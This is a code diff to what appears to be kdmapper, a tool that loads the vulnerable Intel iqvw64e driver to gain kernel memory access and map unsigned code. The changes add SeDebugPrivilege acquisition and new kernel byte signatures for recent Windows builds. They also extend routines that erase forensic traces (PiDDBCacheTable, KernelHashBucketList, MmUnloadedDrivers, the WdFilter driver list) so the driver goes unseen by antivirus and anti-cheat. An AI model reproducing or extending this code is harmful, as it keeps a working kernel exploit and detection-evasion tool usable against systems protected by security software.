@@ -29,11 +29,28 @@ bool intel_driver::IsRunning() {
 	return false;
 }
 
+NTSTATUS intel_driver::AcquireDebugPrivilege() {
+	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+	if (ntdll == NULL) {
+		return (NTSTATUS)0xC0000001;
+	}
+
+	auto RtlAdjustPrivilege = (nt::RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
+	if (!RtlAdjustPrivilege) {
+		return (NTSTATUS)0xC0000001;
+	}
+
+	ULONG SE_DEBUG_PRIVILEGE = 20UL;
+	BOOLEAN SeDebugWasEnabled;
+	return RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnabled);
+}
+
 HANDLE intel_driver::Load() {
 	srand((unsigned)time(NULL) * GetCurrentThreadId());
 
 	//from https://github.com/ShoaShekelbergstein/kdmapper as some Drivers takes same device name
 	if (intel_driver::IsRunning()) {
+		Log(L"[-] \\Device\\Nal is already in use. Restart the machine or unload the leftover driver." << std::endl);
 		return INVALID_HANDLE_VALUE;
 	}
 
@@ -48,16 +65,27 @@ HANDLE intel_driver::Load() {
 
 	std::wstring driver_path = GetDriverPath();
 	if (driver_path.empty()) {
+		Log(L"[-] Failed to get TEMP path" << std::endl);
 		return INVALID_HANDLE_VALUE;
 	}
 
 	_wremove(driver_path.c_str());
 
 	if (!utils::CreateFileFromMemory(driver_path, (const char*)intel_driver_resource::driver, sizeof(intel_driver_resource::driver))) {
+		Log(L"[-] Failed to write the vulnerable driver to disk" << std::endl);
 		return INVALID_HANDLE_VALUE;
 	}
 
-	if (!service::RegisterAndStart(driver_path)) {
+	NTSTATUS debug_status = AcquireDebugPrivilege();
+	if (!NT_SUCCESS(debug_status)) {
+		Log(L"[-] Failed to acquire SeDebugPrivilege, status 0x" << std::hex << debug_status << std::endl);
+		_wremove(driver_path.c_str());
+		return INVALID_HANDLE_VALUE;
+	}
+
+	NTSTATUS load_status = service::RegisterAndStart(driver_path);
+	if (!NT_SUCCESS(load_status)) {
+		Log(L"[-] Failed to register/start the vulnerable driver, status 0x" << std::hex << load_status << std::endl);
 		_wremove(driver_path.c_str());
 		return INVALID_HANDLE_VALUE;
 	}
@@ -66,32 +94,45 @@ HANDLE intel_driver::Load() {
 
 	if (!result || result == INVALID_HANDLE_VALUE)
 	{
+		Log(L"[-] Failed to open \\Device\\Nal, last error " << GetLastError() << std::endl);
 		intel_driver::Unload(result);
 		return INVALID_HANDLE_VALUE;
 	}
 
 	ntoskrnlAddr = utils::GetKernelModuleAddress("ntoskrnl.exe");
 	if (ntoskrnlAddr == 0) {
+		Log(L"[-] Failed to get ntoskrnl.exe address" << std::endl);
+		intel_driver::Unload(result);
+		return INVALID_HANDLE_VALUE;
+	}
+
+	IMAGE_DOS_HEADER dos_header = { 0 };
+	if (!intel_driver::ReadMemory(result, ntoskrnlAddr, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE) {
+		Log(L"[-] Can't read ntoskrnl.exe through iqvw64e. Is an AV/AC blocking the driver?" << std::endl);
 		intel_driver::Unload(result);
 		return INVALID_HANDLE_VALUE;
 	}
 
 	if (!intel_driver::ClearPiDDBCacheTable(result)) {
+		Log(L"[-] Failed to clear PiDDBCacheTable" << std::endl);
 		intel_driver::Unload(result);
 		return INVALID_HANDLE_VALUE;
 	}
 
 	if (!intel_driver::ClearKernelHashBucketList(result)) {
+		Log(L"[-] Failed to clear g_KernelHashBucketList" << std::endl);
 		intel_driver::Unload(result);
 		return INVALID_HANDLE_VALUE;
 	}
 
 	if (!intel_driver::ClearMmUnloadedDrivers(result)) {
+		Log(L"[-] Failed to clear MmUnloadedDrivers" << std::endl);
 		intel_driver::Unload(result);
 		return INVALID_HANDLE_VALUE;
 	}
 
 	if (!intel_driver::ClearWdFilterDriverList(result)) {
+		Log(L"[-] Failed to clear WdFilterDriverList" << std::endl);
 		intel_driver::Unload(result);
 		return INVALID_HANDLE_VALUE;
 	}
@@ -116,12 +157,17 @@ bool intel_driver::ClearWdFilterDriverList(HANDLE device_handle) {
 		return false;
 	}
 
-	auto MpFreeDriverInfoExRef = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\x49\x8B\xC9\x00\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "xxx?x?xx???????????x");
+	auto MpFreeDriverInfoExRef = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "x?xx???????????x");
 	if (!MpFreeDriverInfoExRef) {
-		return false;
+		// some WdFilter versions insert an extra instruction before the call
+		MpFreeDriverInfoExRef = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\x89\x00\x08\x00\x00\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "x?x???x???????????x");
+		if (!MpFreeDriverInfoExRef) {
+			return false;
+		}
+		MpFreeDriverInfoExRef += 0x3;
 	}
 
-	MpFreeDriverInfoExRef += 0x7; // skip until call instruction
+	MpFreeDriverInfoExRef += 0x3; // skip until call instruction
 
 	RuntimeDriversList = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)RuntimeDriversList, 3, 7);
 	uintptr_t RuntimeDriversList_Head = RuntimeDriversList - 0x8;
@@ -346,11 +392,23 @@ uint64_t intel_driver::MmAllocateIndependentPagesEx(HANDLE device_handle, uint32
 	
 	if (!kernel_MmAllocateIndependentPagesEx)
 	{
-		kernel_MmAllocateIndependentPagesEx = intel_driver::FindPatternInSectionAtKernel(device_handle, (char*)"PAGELK", intel_driver::ntoskrnlAddr, 
-			(BYTE*)"\xE8\x00\x00\x00\x00\x48\x8B\xF0\x48\x85\xC0\x0F\x84\x00\x00\x00\x00\x44\x8B\xC5\x33\xD2\x48\x8B\xC8\xE8\x00\x00\x00\x00\x48\x8D\x46\x3F\x48\x83\xE0\xC0", 
-			(char*)"x????xxxxxxxx????xxxxxxxxx????xxxxxxxx");
-		if (!kernel_MmAllocateIndependentPagesEx) {
-			return 0;
+		//KeAllocateInterrupt -> 41 8B D6 B9 00 10 00 00 E8 ?? ?? ?? ?? 48 8B D8 (1803 - 24H2)
+		kernel_MmAllocateIndependentPagesEx = intel_driver::FindPatternInSectionAtKernel(device_handle, (char*)".text", intel_driver::ntoskrnlAddr,
+			(BYTE*)"\x41\x8B\xD6\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8",
+			(char*)"xxxxxxxxx????xxx");
+		if (kernel_MmAllocateIndependentPagesEx) {
+			kernel_MmAllocateIndependentPagesEx += 8;
+		}
+		else {
+			//26H2: mov edx, reg32 (no REX prefix)
+			kernel_MmAllocateIndependentPagesEx = intel_driver::FindPatternInSectionAtKernel(device_handle, (char*)".text", intel_driver::ntoskrnlAddr,
+				(BYTE*)"\x8B\x00\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8",
+				(char*)"x?xxxxxx????xxx");
+			if (!kernel_MmAllocateIndependentPagesEx) {
+				return 0;
+			}
+
+			kernel_MmAllocateIndependentPagesEx += 7;
 		}
 
 		kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmAllocateIndependentPagesEx, 1, 5);
@@ -371,14 +429,32 @@ bool intel_driver::MmFreeIndependentPages(HANDLE device_handle, uint64_t address
 
 	if (!kernel_MmFreeIndependentPages)
 	{
-		kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, 
-			(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF", 
+		kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr,
+			(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF",
 			(char*)"xxxxxxxxx????xxxxxxx");
-		if (!kernel_MmFreeIndependentPages) {
-			return false;
+		if (kernel_MmFreeIndependentPages) {
+			kernel_MmFreeIndependentPages += 8;
 		}
+		else {
+			//Windows 11
+			kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr,
+				(BYTE*)"\x8B\x15\x00\x00\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B",
+				(char*)"xx????xxxx????xxx");
+			if (kernel_MmFreeIndependentPages) {
+				kernel_MmFreeIndependentPages += 9;
+			}
+			else {
+				//26H2: rcx source register may differ
+				kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr,
+					(BYTE*)"\x8B\x15\x00\x00\x00\x00\x48\x8B\x00\xE8\x00\x00\x00\x00\x48\x8D",
+					(char*)"xx????xx?x????xx");
+				if (!kernel_MmFreeIndependentPages) {
+					return false;
+				}
 
-		kernel_MmFreeIndependentPages += 8;
+				kernel_MmFreeIndependentPages += 9;
+			}
+		}
 
 		kernel_MmFreeIndependentPages = (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmFreeIndependentPages, 1, 5);
 		if (!kernel_MmFreeIndependentPages) {
@@ -401,14 +477,33 @@ BOOLEAN intel_driver::MmSetPageProtection(HANDLE device_handle, uint64_t address
 	
 	if (!kernel_MmSetPageProtection)
 	{
-		kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, 
-			(BYTE*)"\x41\xB8\x00\x00\x00\x00\x48\x00\x00\x00\x8B\x00\xE8\x00\x00\x00\x00\x84\xC0\x74\x09\x48\x81\xEB\x00\x00\x00\x00\xEB", 
-			(char*)"xx????x???x?x????xxxxxxx????x");
-		if (!kernel_MmSetPageProtection) {
-			return FALSE;
+		// 0F 45 ? ? 8D ? ? ? FF FF E8
+		kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel(device_handle, "PAGELK", intel_driver::ntoskrnlAddr,
+			(BYTE*)"\x0F\x45\x00\x00\x8D\x00\x00\x00\xFF\xFF\xE8",
+			(char*)"xx??x???xxx");
+		if (kernel_MmSetPageProtection) {
+			kernel_MmSetPageProtection += 10;
 		}
+		else {
+			// 0F 45 ? ? 45 8B ? ? ? ? 8D ? ? ? ? ? ? FF FF E8 (some builds insert an instruction)
+			kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel(device_handle, "PAGELK", intel_driver::ntoskrnlAddr,
+				(BYTE*)"\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8",
+				(char*)"xx??xx????x??????xxx");
+			if (kernel_MmSetPageProtection) {
+				kernel_MmSetPageProtection += 19;
+			}
+			else {
+				// 26H2: LEA with REX prefix
+				kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel(device_handle, "PAGELK", intel_driver::ntoskrnlAddr,
+					(BYTE*)"\x0F\x45\x00\x00\x41\x8D\x00\x00\x00\xFF\xFF\xE8",
+					(char*)"xx??xxx???xx");
+				if (!kernel_MmSetPageProtection) {
+					return FALSE;
+				}
 
-		kernel_MmSetPageProtection += 12;
+				kernel_MmSetPageProtection += 11;
+			}
+		}
 
 		kernel_MmSetPageProtection = (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmSetPageProtection, 1, 5);
 		if (!kernel_MmSetPageProtection) {
@@ -756,22 +851,39 @@ intel_driver::PiDDBCacheEntry* intel_driver::LookupEntry(HANDLE device_handle, P
 
 bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTable added on LoadDriver
 
-	PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x"); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 66 FF 88 ? ? ? ? B2 01 48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B ? 24 update for build 22000.132
+	PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x"); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 66 FF 88 ? ? ? ? B2 01 48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B ? 24 (22000.132+)
 	PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", "xxxxxx"); // 66 03 D2 48 8D 0D
 
-	if (PiDDBLockPtr == NULL) { // PiDDBLock pattern changes a lot from version 1607 of windows and we will need a second pattern if we want to keep simple as posible
-		PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x"); // 48 8B 0D ? ? ? ? 48 85 C9 0F 85 ? ? ? ? 48 8D 0D ? ? ? ? E8 ? ? ? ? E8 build 22449+ (pattern can be improved but just fine for now)
+	if (PiDDBLockPtr == NULL) { // PiDDBLock pattern changes a lot from version 1607 of windows
+		PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x"); // build 22449+
 		if (PiDDBLockPtr == NULL) {
-			return false;
+			PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x"); // build 26100.1000
+			if (PiDDBLockPtr == NULL) {
+				// 26H2 (26300+): NOP before the call is gone
+				PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x");
+				if (PiDDBLockPtr == NULL) {
+					return false;
+				}
+				PiDDBLockPtr += 19; //fourth pattern offset
+			}
+			else {
+				PiDDBLockPtr += 19; //third pattern offset
+			}
 		}
-		PiDDBLockPtr += 16; //second pattern offset
+		else {
+			PiDDBLockPtr += 16; //second pattern offset
+		}
 	}
 	else {
 		PiDDBLockPtr += 28; //first pattern offset
 	}
 
 	if (PiDDBCacheTablePtr == NULL) {
-		return false;
+		PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\xF9\x33\xC0\x48\x8D\x0D", "xxxxxxxx");
+		if (PiDDBCacheTablePtr == NULL) {
+			return false;
+		}
+		PiDDBCacheTablePtr += 2;
 	}
 
 	PVOID PiDDBLock = ResolveRelativeAddress(device_handle, (PVOID)PiDDBLockPtr, 3, 7);
@@ -888,7 +1000,11 @@ bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
 	//Thanks @KDIo3 and @Swiftik from UnknownCheats
 	auto sig = FindPatternInSectionAtKernel(device_handle, "PAGE", ci, PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"), "xxx????x?xxxxxxx");
 	if (!sig) {
-		return false;
+		// 26H2: test ModRM byte may differ
+		sig = FindPatternInSectionAtKernel(device_handle, "PAGE", ci, PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x00\x40\x00\x20\x00\x00"), "xxx????x?x?xxxxx");
+		if (!sig) {
+			return false;
+		}
 	}
 	auto sig2 = FindPatternAtKernel(device_handle, (uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), "xxx");
 	if (!sig2) {
